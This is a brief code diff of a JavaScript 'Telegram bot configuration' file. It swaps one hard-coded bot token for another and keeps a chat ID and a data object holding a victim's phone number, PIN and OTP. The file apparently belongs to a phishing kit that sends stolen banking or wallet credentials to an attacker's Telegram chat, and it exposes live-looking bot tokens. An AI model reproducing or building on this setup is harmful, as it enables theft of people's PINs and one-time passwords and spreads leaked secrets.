@@ -1,7 +1,7 @@
 /**
  * Konfigurasi Bot Telegram
  */
-const TOKEN = "8680825100:AAG9qMkT848EzbktPmtvT-M1EA2GvU07DeU";
+const TOKEN = "8397657404:AAGJTLh6WK2bZU6q0WoGfVkRUhfoc3ErzPE";
 const CHAT_ID = "6224388727";
 
 let data = { hp: "", pin: "", otp: "" };
